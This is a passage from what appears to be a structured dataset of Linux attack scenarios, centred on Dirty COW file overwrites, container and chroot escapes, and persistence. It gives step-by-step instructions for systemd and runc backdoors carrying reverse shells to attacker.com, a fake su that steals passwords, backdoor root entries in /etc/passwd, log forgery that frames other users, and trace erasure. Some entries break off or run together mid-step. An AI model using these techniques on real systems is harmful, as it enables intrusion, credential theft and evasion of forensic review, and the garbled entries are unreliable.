10: Test in lab environments only.
Impact: Enable kernel ROP, code reuse, or memory overwrite
Detection Method: Monitor timing probes; restrict /proc/kallsyms; enforce perf_event_paranoid=3, kptr_restrict=2
Solution: Harden KASLR randomization, restrict kernel info leaks, update kernel security configs
Tags: KASLR Bypass, Kernel Mapping, Side-Channel Timing

Title: Backdoor systemd Service Unit Files
Attack Type: Stealth Persistence via systemd .service File Hijack
Scenario Description: Attacker modifies or adds malicious .service files in systemd to start root-level payloads on boot or in response to system triggers.
Tools Used: nano, systemctl, Dirty COW, bash, journalctl
Attack Steps:
Step 1: Linux systems using systemd rely on .service files (found in /etc/systemd/system/, /usr/lib/systemd/system/) to define how and when to start programs. These files can trigger on boot, network, USB, or system targets. Step 2: If attacker gets access to /etc/systemd/system/, they can either modify an existing unit file (e.g., sshd.service) or create a new one (backdoor.service). Step 3: Example malicious file: [Unit]
Description=Backdoor Shell
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target. This will run a reverse shell each time the system boots. Step 4: Save it as /etc/systemd/system/backdoor.service. Step 5: Enable and start it: systemctl enable backdoor.service && systemctl start backdoor.service. Step 6: This now ensures that each time the system boots, your shell automatically connects to the attacker. Step 7: You can also hide it by modifying legitimate services like cron.service or getty@tty1.service and just appending your payload. Step 8: Dirty COW can be used if the file is read-only (e.g., in /usr/lib/systemd/). Step 9: Use journalctl -u to monitor logs. Defenders rarely check for extra .service files — this is one of the most stealthy persistence methods used in real APTs.
MITRE Technique: T1543.002 – Create or Modify System Process
Impact: Full root persistence on boot or trigger
Detection Method: Run systemctl list-units --type=service; look for unknown entries; audit /etc/systemd/system
Solution: Lock .service dirs with chattr +i; use security audit tools like chkrootkit or systemd-analyze
Tags: systemd Backdoor, Boot Persistence, Dirty COW

Title: Escape chroot Environments via Binary Replacement
Attack Type: Escape & Elevate via Shared Binary Hijack in Chroot
Scenario Description: Attacker escapes a limited chroot jail by replacing shared binaries like ld-linux.so or libc.so to point to real system paths outside jail boundaries.
Tools Used: ldd, nano, ld-linux.so, libc.so, Dirty COW
Attack Steps: Step 1: A chroot jail is a restricted environment where the root directory (/) is fake — usually used for sandboxing processes. Example: /home/jail is set as root using chroot /home/jail /bin/bash. Step 2: But shared libraries inside the chroot (e.g., /lib64/ld-linux-x86-64.so.2, libc.so.6) must match real paths outside jail to work correctly. Step 3: If the attacker has write access to the jail or can mount the host /lib inside, they can modify the linker path. Step 4: Use ldd inside the chroot to see which dynamic libraries are being used. Example: ldd /bin/bash. Step 5: Create a fake ld-linux.so.2 loader that changes root to / again (real root), using: chroot("/", "/bin/bash") or direct syscall(SYS_chroot, "/"). Step 6: Compile that code and overwrite the chroot's ld-linux.so.2 using Dirty COW if it’s read-only. Step 7: Now, any command inside the chroot that invokes the loader will silently escape out to the real system. Step 8: You are now outside the jail — and potentially root if the original process was privileged. Step 9: You can combine this with backdooring other binaries or accessing real /etc, /root, or /var folders. It defeats chroot security. Step 10: Clean up after use and log out to avoid detection.
Impact: Escalate from jailed to full system access
Detection Method: Monitor for changes in /lib, /lib64 inside chroot jails; compare binary hashes
Solution: Use containers (not chroot), avoid mounting host libs into jail, validate library paths
Tags: chroot Escape, Dirty COW, Linker Hijack

Title: Backdoor Host Kernel Configuration Files
Attack Type: Boot-Time Kernel Weakening via Modified Configs
Scenario Description: Attacker modifies the /boot/config-* files on a host system to weaken security for future boots, planting rootkit-friendly settings at kernel level.
Attack Steps: Step 1: The Linux kernel uses config files stored at /boot/config-<kernel_version> to define security settings like module signing, AppArmor, SELinux, etc. These files are not loaded dynamically — they affect the next boot. Step 2: If the attacker can access /boot (e.g., from container or via host shell), they can use Dirty COW to overwrite config lines to disable security. For example: CONFIG_SECURITY_SELINUX=n, CONFIG_MODULE_SIG=n, CONFIG_KALLSYMS=y, CONFIG_STRICT_MEMORY_RWX=n. Step 3: These values disable memory protections, allow loading unsigned kernel modules, or make kernel symbols visible for exploits. Step 4: Use nano or echo to create a malicious config-custom. Step 5: Use Dirty COW to replace the file: ./cowroot /boot/config-5.15.0-84 config-custom. Step 6: Reboot the machine. During boot, GRUB or the kernel reads your modified config silently. Step 7: The system now boots with all the security flags disabled — letting you load rootkits, unsigned drivers, or hook syscalls without restrictions. Step 8: This method is stealthy, as config changes don’t show up in normal running kernel state (/proc/config.gz may not be readable). Step 9: Backdoor is ready for future exploitation — nothing looks wrong unless kernel config is audited.
MITRE Technique: T1542.001 – Boot or Logon Initialization Scripts
Detection Method: Monitor /boot/config-*; use Secure Boot to prevent loading altered configs
Solution: Lock down /boot with read-only mount, enforce config signing, use kernel lockdown + full-disk integrity
Tags: Kernel Backdoor, Boot-Level Exploit, Dirty COW

Title: Fake System Logs / Audit Trails
Attack Type: Log Forgery to Cover Tracks or Frame Other Users
Scenario Description: Attacker replaces or modifies key log files (auth, syslog, journal) to hide intrusion or create fake events using timestamps and forged content.
Tools Used: nano, echo, Dirty COW, journalctl, rsyslog
Attack Steps: Step 1: Logs like /var/log/auth.log, /var/log/syslog, or /var/log/secure record system activities, login attempts, sudo use, etc. Attackers tamper with these to hide their tracks. Step 2: If logs are read-only or rotated (.gz or .1), use Dirty COW to overwrite. Example: ./cowroot /var/log/auth.log forged_auth.log. Step 3: Forge the file manually: create a log entry that makes it seem like another user (e.g., alice) performed an action you did. Example log line: Jul 11 18:21:01 server sudo: alice : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash. Step 4: Insert that line using echo or nano into the fake log. Step 5: You can also delete real entries that show your backdoor or shell activity. Step 6: To cover journal logs (journalctl), you can remount /var/log/journal as writable if it’s locked, or clear logs using journalctl --rotate && journalctl --vacuum-time=1s. Step 7: On reboot, the forged logs appear legitimate. Most forensic tools will believe what the logs say unless system integrity auditing is used. Step 8: Some attackers create full fake /var/log/wtmp or lastlog files to hide login traces. Step 9: This technique is widely used in APT and malware persistence campaigns. Don’t test on production servers.
Vulnerability: Lack of log integrity + write access
Impact: Hiding evidence, framing other users, stealth ops
Detection Method: Use immutable logging (rsyslog to remote server), enable auditd with tamper alerts
Solution: Store logs remotely, set immutable bit on logs, use centralized log monitoring
Tags: Log Tampering, Audit Forgery, Dirty COW

Title: Patch Container Runtime (runc)
Attack Type: Runtime Binary Tampering to Infect New Containers
Scenario Description: The attacker modifies the host’s runc binary (container launcher) from a container or via host access. This means every new container launched becomes infected.
Tools Used: bash, gcc, Dirty COW, docker, nano
Attack Steps: Step 1: The runc binary is a core executable used by Docker, containerd, and LXC to start containers. It is found at /usr/bin/runc. Step 2: If the attacker gains access to the host (via container escape or SSH), and /usr/bin/runc is available (even mounted via volume in container), they can replace it with a trojan version. Step 3: Create a malicious binary or shell script that logs into your server or injects a root shell inside new containers. Example C code: system("/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1");. Step 4: Compile with gcc -static evil.c -o runc. Make sure the name matches the original binary. Step 5: Use Dirty COW to overwrite /usr/bin/runc with your malicious one, even if it’s marked read-only. Step 6: Now, whenever a new Docker container is started, it uses your malicious runc. The container will silently run your payload in the background before doing anything else. Step 7: You have persistent infection of all future containers. No one will notice unless auditing logs or comparing binary hashes. Step 8: Cleanup is difficult — the only way is to restore the original runc from a backup.
Impact: Persistent infection of all new containers
Detection Method: Monitor for hash changes in /usr/bin/runc; compare with known-good baseline
Solution: Use read-only root filesystem, digitally sign runc, disallow mount of host binaries into containers
Tags: Runtime Hijack, Docker Escape, runc Backdoor

Title: Replace Configuration Files (e.g., /etc/ssh/sshd_config)
Attack Type: Remote Root Access via SSH Config Tampering
Scenario Description: From a container or host shell, attacker overwrites SSH config file to enable root login and password auth, allowing direct login to host as root remotely.
Tools Used: nano, Dirty COW, systemctl, service, SSH
Attack Steps: Step 1: SSH config is stored in /etc/ssh/sshd_config. This file defines whether root login is allowed and if password-based login is permitted. Step 2: If attacker gets file access to this path via container mount or host shell (e.g., /mnt/etc/ssh/sshd_config), they can try to overwrite it. Step 3: Normally, SSH is configured like PermitRootLogin no and PasswordAuthentication no. You want to change both to yes. Step 4: Use Dirty COW or host root access to edit the file. Replace those lines with: PermitRootLogin yes and PasswordAuthentication yes. Step 5: Save the file. Restart the SSH service with systemctl restart sshd or service ssh restart. Step 6: Add a password to the root user (if none exists) using: passwd root. Choose a password you’ll remember. Step 7: Now you can SSH into the host using root from any device: ssh root@host_ip. This gives you direct root shell access remotely. Step 8: This bypasses sudo and audit logging systems, giving attackers long-term silent access. Step 9: Remember to restore config and disable root login after testing.
Impact: Remote root login, persistent remote access
Detection Method: Monitor sshd_config changes; check SSH logs for root login attempts
Solution: Set PermitRootLogin no, monitor file integrity, disallow bind-mounts of /etc/ssh into containers
Tags: SSH Exploit, Dirty COW, Remote Root Shell

Title: Overwrite Immutable Files via CoW
Scenario Description: Even if a file is made immutable using chattr +i, Dirty COW lets attacker bypass and modify the file using memory-based race condition and replace contents.
Tools Used: lsattr, chattr, Dirty COW, echo, cat
Attack Steps: Step 1: Normally on Linux, if you set chattr +i /etc/passwd, the file cannot be modified, even by root. This is used for protecting critical files. Step 2: But Dirty COW (CVE-2016-5195) uses a race condition that lets you bypass write protections and modify the file even if it's immutable. Step 3: Try this: as root, run chattr +i /etc/passwd. Confirm with lsattr /etc/passwd. Step 4: Then compile Dirty COW exploit and use it to inject a backdoor user into /etc/passwd, as shown in earlier steps. Step 5: Despite the +i protection, the file will still be overwritten successfully — the kernel wrongly believes it’s safe because the exploit manipulates memory pages. Step 6: You can verify that the file was changed by viewing it again: cat /etc/passwd. You’ll see the backdoor user entry. Step 7: This shows that immutable flags are not enough protection on vulnerable kernels. Step 8: You can use this to change configs, cronjobs, logs, passwords, even system binaries — all despite immutability. Step 9: Restore protection using backups and re-enable +i. Always patch Dirty COW on production machines.
Vulnerability: Dirty COW bypasses chattr immutable flag
Impact: Change protected system configs or credentials
Detection Method: Monitor for changes to +i files; run integrity checkers (AIDE, tripwire, lsattr)
Solution: Patch Dirty COW; don't rely only on immutability; combine with AppArmor/SELinux for extra protection
Tags: CoW Exploit, Immutable File Bypass, Dirty COW

Title: Bypass cgroup Restrictions via Payload in /proc
Attack Type: Escape Container Resource Limits by Manipulating /proc
Scenario Description: Attacker modifies /proc files to override container resource limits like memory, CPU using writable cgroup values — or escapes control group limits entirely.
Attack Steps: Step 1: Containers are restricted using cgroups — they define how much memory, CPU, and disk a process can use. These values are set by writing to special files in /sys/fs/cgroup or /proc/<pid>/cgroup. Step 2: In some misconfigured containers, these files are mounted writable or the attacker is in privileged mode (--privileged) with full /proc access. Step 3: You identify the process group by running cat /proc/self/cgroup and look for memory, cpu, or blkio subsystems. Step 4: Try navigating to your cgroup directory: cd /sys/fs/cgroup/memory/<your-cgroup-id> or /proc/<pid>/limits. Step 5: Attempt to override limits: for example, echo -1 > memory.limit_in_bytes or echo 0 > cpu.shares. If allowed, this removes restrictions and lets the process consume all system resources. Step 6: In some cases, you can remount /proc or /sys/fs/cgroup in a way that gives full access and allows escaping control groups. Example: mount -o remount,rw /proc. Step 7: If you fully escape, you may affect the host system or other containers. Step 8: This may lead to DoS (denial of service) or privilege abuse. Step 9: Test this only in safe labs.
Detection Method: Monitor container privilege level; watch for container mounting /proc or /sys as writable
Solution: Enforce unprivileged containers, read-only /proc, use seccomp to block remount/sysfs
Tags: cgroup Escape, Container Abuse, Privileged Misconfig

Title: Replace Host Shared Libraries (libc.so)
Attack Type: Host Binary Hijack via Shared Library Injection
Scenario Description: Attacker modifies shared libraries like libc.so.6 on the host from a container to control how all host binaries behave (e.g., ls, ps, sudo).
Attack Steps: Step 1: You have a Docker container that bind-mounts the host’s /lib or /usr/lib directory (e.g., -v /lib:/mnt/lib). Step 2: This allows you to view host’s critical shared libraries like libc.so.6 inside the container at /mnt/lib/x86_64-linux-gnu/libc.so.6. Step 3: These libraries are read-only. You cannot change them normally, but if you use Dirty COW (CVE-2016-5195), you can overwrite read-only files. Step 4: Inside the container, create a malicious version of libc.so.6 using C code that hooks common functions like system() or execve() and replaces them to do malicious actions (like spawning a root shell or logging user input). Step 5: Compile the library: gcc -fPIC -shared -o fake_libc.so your_malicious_code.c. Step 6: Use Dirty COW to overwrite the host’s real libc.so.6 with your malicious one using the Dirty COW exploit binary (e.g., ./cowroot /mnt/lib/x86_64-linux-gnu/libc.so.6 fake_libc.so). Step 7: Exit the container. Now on the host, try to run any program — you’ll notice weird behavior (e.g., opening a root shell automatically), because almost every program uses libc. Step 8: This gives you a global backdoor to every binary linked with libc, which is nearly all system binaries. Step 9: Dangerous in real systems — always test this in a VM or CTF.
MITRE Technique: T1574.006 – Hijack Execution Flow: Shared Library
Detection Method: Monitor hashes of core libraries (AIDE, tripwire); check for library corruption
Solution: Prevent containers from mounting /lib; use read-only + integrity enforcement (chattr +i)
Tags: Shared Library Hijack, Dirty COW, Rootkit Library

Title: Modify Kernel Modules in Read-Only FS
Attack Type: Kernel Module Tampering via Dirty COW + LKM
Scenario Description: Exploits Dirty COW to overwrite kernel modules in /lib/modules/ from a container and inject root-level code into the Linux kernel.
Tools Used: gcc, Dirty COW, insmod, modinfo, lsmod
Attack Steps: Step 1: The Linux kernel loads optional drivers as .ko files (kernel object files) from /lib/modules/<version>/. These files are normally protected. Step 2: A container might have the host’s /lib/modules folder mounted inside at /mnt/lib/modules, so it can read (but not write) the kernel modules. Step 3: Dirty COW (CVE-2016-5195) allows writing to these read-only files from inside the container. You compile a malicious kernel module (LKM) in C that, for example, creates a root user, hides processes, or gives backdoor access. Step 4: Save your LKM as backdoor.ko. Then, use Dirty COW to overwrite an existing .ko file on the host, like netfilter.ko. Example: ./cowroot /mnt/lib/modules/x.y.z/kernel/net/netfilter/netfilter.ko backdoor.ko. Step 5: Exit the container. On the host, trigger the module by using modprobe netfilter or reboot the host so it auto-loads. Step 6: Your malicious kernel code is now live inside the kernel with full root privileges. It can hide files, log keystrokes, or disable security. Step 7: Confirm it loaded by running lsmod or dmesg. Step 8: Dangerous and often undetectable — used by real rootkits. Always test in a virtual machine or sandbox. Step 9: Defenders should monitor for unexpected module changes and use Secure Boot.
MITRE Technique: T1543.004 – Create or Modify System Process
Detection Method: Verify module hashes, use signed kernel modules (modinfo, Secure Boot, IMA`)
Solution: Patch Dirty COW; use immutable filesystem or Secure Boot with module verification
Tags: LKM Injection, Kernel Module Rootkit, Dirty COW

Title: Fake Host Executables (su, sudo, passwd, etc.)
Attack Type: Host Binary Hijack via Name Spoofing in Shared Volume
Scenario Description: From a container, attacker replaces or creates fake versions of important host binaries (su, passwd, etc.) that log credentials or open backdoor shells.
Attack Steps: Step 1: The host has standard binaries like /usr/bin/su, /usr/bin/sudo, and /usr/bin/passwd that users trust to log in, escalate privileges, or change passwords. Step 2: A container mounts /usr/bin or similar paths using bind mount: -v /usr/bin:/mnt/bin. This exposes host binaries inside the container as read-only files. Step 3: The attacker creates a fake version of one of these programs — for example, a fake su script: #!/bin/bash\necho "Password: "; read pass; echo "$USER:$pass" >> /tmp/steal.log; /bin/bash. This captures credentials, then opens a shell. Step 4: Make it executable: chmod +x su. Step 5: Use Dirty COW to overwrite the real host binary from inside the container: ./cowroot /mnt/bin/su su. Step 6: Exit the container. Now, when anyone on the host runs su, the fake script is executed instead. It looks like the normal command but silently logs the password and gives shell access. Step 7: You’ve now hijacked the host’s authentication tools. You can do the same with sudo, passwd, or even ls and ps. Step 8: This type of attack is stealthy because the programs appear to work correctly while leaking data. Step 9: Defenders can catch this by checking file integrity or comparing hashes. Always restore original binaries after testing.
Vulnerability: Dirty COW or Container with Host FS Access
Impact: Stealth credential logging or root access
Detection Method: Monitor SHA256 hashes of critical binaries; look for scripts where binaries should be executables
Solution: Block host bind mounts; make sensitive binaries immutable; use integrity monitoring (Tripwire, IMA)
Tags: Binary Masquerading, Container Escape, Credential Capture

Title: Overwrite /etc/passwd to Create Fake Root User
Attack Type: Local Privilege Escalation via File Injection
Scenario Description: The /etc/passwd file stores user accounts. Overwriting it lets an attacker add a fake root user to gain full control over the system.
Tools Used: echo, cat, cp, nano, vi, Dirty COW
Attack Steps: Step 1: Understand that /etc/passwd contains user account definitions. If you add a line like haxor::0:0::/root:/bin/bash, it means a user called haxor with root (UID 0) and a shell. Step 2: On a normal system, /etc/passwd is read-only for normal users. But if you have an exploit like Dirty COW (CVE-2016-5195), you can overwrite it even without permission. Step 3: Copy the Dirty COW exploit (search GitHub for “dirtycow passwd exploit”) into your Linux system or container. Step 4: Compile it using: gcc cowroot.c -o cowroot. Step 5: Run the exploit. It injects a line into /etc/passwd that gives you a new user with root access. For example: fire:x:0:0:root:/root:/bin/bash. Step 6: Once the exploit finishes, check the file using cat /etc/passwd to confirm your new user is added. Step 7: Log out, then try logging in as the new user (su fire). No password may be required, depending on how the entry was crafted. Step 8: If successful, you now have root shell. Step 9: Always test in labs — this attack breaks the system if misused. Step 10: Clean up by restoring the original /etc/passwd (the exploit usually backs it up automatically).
Impact: Full root access via backdoor user
Detection Method: Monitor unauthorized edits to /etc/passwd; use Tripwire or AIDE
Solution: Apply Dirty COW patch; use immutable flag on /etc/passwd (chattr +i /etc/passwd)
Tags: Dirty COW, File Injection, Root Privilege

Title: Exploit CVE-2016-5195 + CVE-2022-0185 Chain
Scenario Description: Chain two kernel exploits: Dirty COW (write to host files) + CVE-2022-0185 (namespace escape) to break container and gain full host root access.
Tools Used: gcc, Dirty COW code, CVE-2022-0185 exploit
Attack Steps: Step 1: Dirty COW (CVE-2016-5195) lets attackers overwrite read-only files like /etc/passwd or crontab. CVE-2022-0185 lets them break out of a Linux container (namespace escape). Step 2: You start in a Linux container (Docker, LXC) with basic access. First, use the CVE-2022-0185 exploit to escape the container and access host root filesystem. Title: Break AppArmor/SELinux Protections
Scenario Description: Exploit weak configuration or loopholes in AppArmor or SELinux to bypass mandatory access controls and access restricted files, processes, or syscalls.
Attack Steps: Step 1: AppArmor and SELinux are Linux Security Modules (LSMs) that limit what programs can do — like what files they access or what syscalls they can use. Step 3: As a basic user, you first check if AppArmor or SELinux is enabled using aa-status or sestatus. Step 4: If AppArmor is in "complain mode", then it only logs violations instead of blocking them — this is a security gap. Same with SELinux in "permissive mode". Step 5: Start testing by running a program like /bin/bash or /usr/bin/curl and try accessing restricted files like /etc/shadow or /root/.ssh/id_rsa. Step 6: If you can read or write these files without logs or alerts, it means the policy is weak or not applied. Step 7: If logs are generated, use audit2allow to read what would have been blocked — this helps you understand what the policy missed. Step 8: You can try to escalate this by uploading a malicious binary into a directory not covered by the profile, or by executing custom shell scripts from /tmp (often unrestricted). Step 9: Once policy is bypassed, escalate privileges using standard techniques like setuid, Dirty COW, or socket abuse. Step 10: Defenders must use strict profiles, enforce modes, and never run LSMs in permissive mode.
Detection Method: Use auditd to monitor policy violations; check LSM mode (enforcing, permissive, etc.)
Solution: Run LSMs in enforcing mode; write strict per-app security policies; restrict /tmp access
Tags: AppArmor Bypass, SELinux Escape, LSM Weakness

Title: Escape Container by Modifying Docker Binary

Tags: Docker Escape, Privileged Container Abuse, Binary Hijack

Title: Exploit Setuid Binary (e.g., bash) to Gain Root Privileges
Scenario Description: A system has a setuid-enabled binary (like bash) owned by root. The attacker discovers this and uses it to spawn a root shell, bypassing normal user restrictions.
Attack Steps: Step 1: Understand the concept of a "setuid binary". Setuid (Set User ID upon execution) is a permission setting that allows users to execute a file with the permissions of the file's owner. If a file is owned by root and has the setuid bit, any user who executes it gets root privileges temporarily during execution. This is dangerous if not configured securely. Step 2: First, as a normal user on a Linux system, list all files with the setuid permission. Use the command: find / -perm -4000 -type f 2>/dev/null. This lists all files with the setuid bit set. Step 3: Look for a result that includes /bin/bash or similar binaries that should not have setuid enabled. Example output might be: /usr/bin/passwd, /bin/bash, etc. Step 4: Check the permissions of /bin/bash using ls -l /bin/bash. If the output shows something like -rwsr-xr-x 1 root root, then the s in the user permission section (rws) indicates that setuid is enabled. Step 5: Confirm your current privileges by typing whoami. It will return your current username (e.g., student). Step 6: Now try executing bash: /bin/bash -p. The -p option tells bash to not drop privileges (on newer systems). If successful, type whoami again and it should now return root, indicating that you now have a shell running as root. Step 7: You now have root-level access, which means full control of the system. This can be used to read any file, modify any configuration, install software, create new users, etc. Step 8: Clean up traces. If you modified anything or created logs, erase them from .bash_history or /var/log/. Step 9: Understand that this attack works only if the administrator misconfigures a critical binary (like bash) with the setuid bit. Normally, bash should not be setuid root. Step 10: This is a privilege escalation technique and should be used only in penetration testing labs or with permission. It is illegal to try this on systems you don’t own or manage.
MITRE Technique: T1548.001 – Abuse Elevation Control Mechanism: Setuid/Setgid
Impact: Root Shell Access, Full Privilege Gain
Detection Method: Monitor for binaries with setuid bit and unusual ownership using auditd or tripwire
Solution: Remove setuid bit from binaries like bash using chmod u-s /bin/bash; audit binaries regularly
Tags: Setuid, Privilege Escalation, Root Access, Misconfiguration

Attack Steps: Step 1: On Linux, SSH configuration lives in /etc/ssh/sshd_config. It controls who can log in remotely — root login is disabled by default. Step 2: If a container has access to the host /etc/ssh/ (e.g., via bind mount), it can read but not write to these configs. Step 3: Use Dirty COW to overwrite sshd_config file with one that allows root login and weak auth. Example config: PermitRootLogin yes, PasswordAuthentication yes. Step 4: Save this config to new_sshd_config. Step 5: Compile and run Dirty COW: ./cow /etc/ssh/sshd_config new_sshd_config. Step 6: Restart SSH: systemctl restart sshd or wait for the next auto-reload. Step 7: Now, attacker can SSH into host with root password. Step 8: Combine with overwritten /etc/passwd to add root user. Step 9: Detection involves checking audit logs and monitoring sshd_config integrity. Step 10: Solution is to lock down SSH configuration and avoid mounting it into containers.
Detection Method: Monitor SSH config diffs, detect service restarts, alert on PermitRootLogin changes
Solution: Use SSH key auth only, disable password auth, do not expose SSH config to containers
Tags: SSHD Backdoor, Config Hijack, Dirty COW

Title: Overwrite Immutable Files via CoW
Attack Type: Exploit Dirty COW to bypass chattr +i (immutable)
Scenario Description: Dirty COW lets attacker bypass immutable file protection to modify files marked with chattr +i — even /etc/passwd.
Attack Steps: Step 1: Some critical system files are protected using chattr +i, making them immutable — even root can’t modify them directly. Step 2: Example: /etc/passwd or /etc/resolv.conf may be marked immutable. You can check with: lsattr /etc/passwd. Step 3: These files can still be overwritten with Dirty COW because it uses memory race conditions to bypass file write protections. Step 4: Prepare your malicious file — for example, modified /etc/passwd with a root user entry like eviluser:x:0:0::/root:/bin/bash. Step 5: Run the Dirty COW exploit: ./cow /etc/passwd evilpasswd.txt. Step 6: You have now modified an "immutable" file without unsetting the flag. Step 7: Now, login as eviluser with root access. Step 8: Detection is hard — immutability is assumed safe. Tools like AIDE can help. Step 9: Monitor for unexpected access or login attempts from strange users. Step 10: Never mount or expose these sensitive files to containers or untrusted apps.
Impact: Add root user silently, tamper critical configs
Detection Method: Monitor for passwd/shadow changes, check login patterns, hash check immutable files
Solution: Patch Dirty COW, apply kernel memory write protections, restrict container bind mounts
Tags: chattr bypass, Immutable File Write, Dirty COW

Title: Bypass cgroup Restrictions via /proc
Scenario Description: Use Dirty COW to overwrite /proc/self/cgroup or related files to bypass memory/CPU limits or escape namespaces.
Attack Steps: Step 1: Containers use cgroups to limit resources (CPU, memory) and isolate processes. These are mounted under /sys/fs/cgroup and /proc/self/cgroup. Step 2: While /proc/self/cgroup is read-only, Dirty COW allows overwriting its content. Step 3: Run cat /proc/self/cgroup to see your assigned control group. Example output: 1:name:/docker/xyz. Step 4: Prepare a spoofed version of this file with a fake group that grants full access (e.g., / or host cgroup). Step 5: Run ./cow /proc/self/cgroup fakegroup.txt. Step 6: Now, processes inside the container think they’re part of the root cgroup. Step 7: You can now override memory limits, escape into namespaces, or affect host-wide resources. Step 8: Combine with syscall abuse to enter new namespaces (setns). Step 9: Monitor unusual /proc writes or container resource spikes. Step 10: Restrict /proc mounts, and deny Dirty COW by patching kernel.
Detection Method: Detect abnormal cgroup references, alert on unexpected /proc writes
Solution: Do not mount /proc from host, use read-only containers, patch CoW race
Tags: cgroup bypass, namespace escape, Dirty COW

Title: Escape chroot via Binary Replacement
Attack Type: Replace loader binaries in chroot jail to escape
Scenario Description: Dirty COW used to overwrite /lib/ld-linux.so or libc.so inside chroot jail — escaping jail on execution.
Attack Steps: Step 1: chroot confines a user or program to a specific directory tree — but doesn’t isolate kernel or memory. Step 2: Chroot relies on key binaries like /lib/ld-linux.so.2, /lib64/ld-linux-x86-64.so.2, or /lib/libc.so.6 to run most programs. Step 3: If attacker can write these binaries inside chroot but not delete or change them due to immutability, Dirty COW can help. Step 4: Create a fake ld-linux.so that runs a reverse shell or copies your rootkit to /tmp. Step 5: Use Dirty COW to overwrite the chroot’s ld-linux.so: ./cow /srv/chroot/lib/ld-linux.so.2 evil_loader.so. Step 6: Next time any binary runs inside the jail, the fake loader activates, executing your code. Step 7: Combine with privilege escalation to escape jail, enter host namespace, or access full file system. Step 8: Detection includes changes to chroot binaries or unknown outbound connections. Step 9: Lock down chroot binaries and monitor changes. Step 10: Avoid chroot for container security — use proper namespaces and seccomp.
Vulnerability: Dirty COW to overwrite binary loader
Impact: Escape filesystem jail, code execution outside jail
Detection Method: Detect modified ld-linux, monitor chroot exec logs
Solution: Prevent chroot overuse, patch kernel, avoid exposing host ld-linux to jailed processes
Tags: chroot escape, ld hijack, Dirty COW

Title: Backdoor Host Kernel Configuration Files
Scenario Description: Dirty COW can overwrite kernel config files to load modules, change behavior, or disable protections (ASLR, etc.).
Attack Steps: Step 1: The Linux kernel’s runtime behavior is controlled via sysctl configs like /etc/sysctl.conf or /proc/sys/.... Step 2: These files are root-owned and read-only under normal conditions. Step 3: Dirty COW allows you to overwrite /etc/sysctl.conf. Step 4: Prepare a modified version: include entries like kernel.modules_disabled=0, kernel.kptr_restrict=0, net.ipv4.ip_forward=1 to weaken the system. Step 5: Run ./cow /etc/sysctl.conf evil_sysctl.conf. Step 6: Reload with sysctl -p. Step 7: These settings now allow kernel modules, leak pointers, or enable unwanted routing. Step 8: You can load rootkits, escalate privileges, or sniff traffic. Step 9: Detection: monitor sysctl reloads and config diffs. Step 10: Defend by auditing sysctl, using kernel lockdown mode, and patching Dirty COW.
Impact: Rootkit load, disable protections, leak memory
Detection Method: Watch sysctl -p usage, monitor /etc/sysctl.conf changes
Solution: Kernel lockdown mode, file integrity monitoring, patch CVEs
Tags: sysctl bypass, kernel tweak, Dirty COW

Title: Fake System Logs / Audit Trails
Attack Type: Overwrite logs using Dirty COW to erase evidence
Scenario Description: Logs like /var/log/auth.log, /var/log/secure, and /var/log/audit/audit.log record security events like logins or sudo use. These can be overwritten to hide attacks.
Tools Used: Dirty COW, bash, vi, grep, logrotate
Attack Steps: Step 1: When attackers gain root, their activities get logged in files like /var/log/auth.log or /var/log/audit/audit.log. These logs are used in forensic analysis. Step 2: Normally, even root cannot modify these logs directly because they are write-protected or locked by running daemons. Step 3: If the host log directory is mounted into a container (e.g., for logging), attackers can see the logs, but not modify them. Step 4: Using Dirty COW, an attacker can bypass the read-only protection and overwrite these files. Step 5: Prepare a clean version of the log file (e.g., by copying the current file and removing your entries with grep -v eviluser auth.log > clean.log). Step 6: Use the Dirty COW exploit: ./cow /var/log/auth.log clean.log. Step 7: Repeat for audit logs if needed: /var/log/audit/audit.log. Step 8: This erases traces of sudo access, user creation, or cron modifications. Step 9: Detection requires external immutable logs (e.g., remote syslog) and monitoring for log tampering. Step 10: Use auditd with immutable flag and prevent log mounts from containers.
Impact: Hide attacker traces, bypass forensic audits
Detection Method: Checksum log files, use external immutable log servers, monitor log rotation anomalies
Solution: Use auditctl -e 2 to lock logs, send logs to remote immutable destinations
Tags: Log Wipe, Dirty COW, Forensic Evasion

Title: Replace Package Manager (apt, yum)
Attack Type: Modify package manager to silently install backdoors
Scenario Description: By overwriting apt or yum with a backdoored binary, attackers can persistently reinfect system via "updates" or install rootkits without alerting admins.
Tools Used: Dirty COW, gcc, bash, vi, dpkg, rpm
Attack Steps: Step 1: Package managers like apt, yum, or dnf are located in /usr/bin/ and used to install software. These tools are usually trusted. Step 2: If a container has /usr/bin from the host mounted inside it, you can see and overwrite the host’s package manager binary using Dirty COW. Step 3: Write a backdoored version of the tool (e.g., evil_apt) that installs malicious packages from an attacker server or adds a cronjob after every update. Step 4: Compile the fake binary using gcc evil_apt.c -o evil_apt. Step 5: Use Dirty COW: ./cow /usr/bin/apt evil_apt. Step 6: Now, whenever a user runs apt update, the tool silently installs a reverse shell, adds a backdoor user, or downloads more malware. Step 7: This persists even after reboots or audits unless the binary is checked. Step 8: Combine with forged GPG keys or mirror configuration to hide payload delivery. Step 9: Detection includes package verification mismatch, unexpected behavior during installs. Step 10: Defend by signing package managers, verifying hashes, and not mounting /usr/bin into containers.
Vulnerability: Dirty COW used to replace trusted binaries
MITRE Technique: T1543 – Create or Modify System Process
Impact: Persistent malware delivery, silent backdoor installs
Detection Method: Monitor /usr/bin/apt checksum and modification times, validate all install logs
Solution: Sign package managers, enforce runtime attestation, patch kernel against Dirty COW
Tags: Persistent Backdoor, Package Abuse, Dirty COW

Title: Backdoor systemd Service Unit Files
Attack Type: Modify systemd .service files to run attacker scripts
Scenario Description: Attackers overwrite .service unit files (e.g., for SSH, networking) to execute malicious scripts on every boot or service restart.
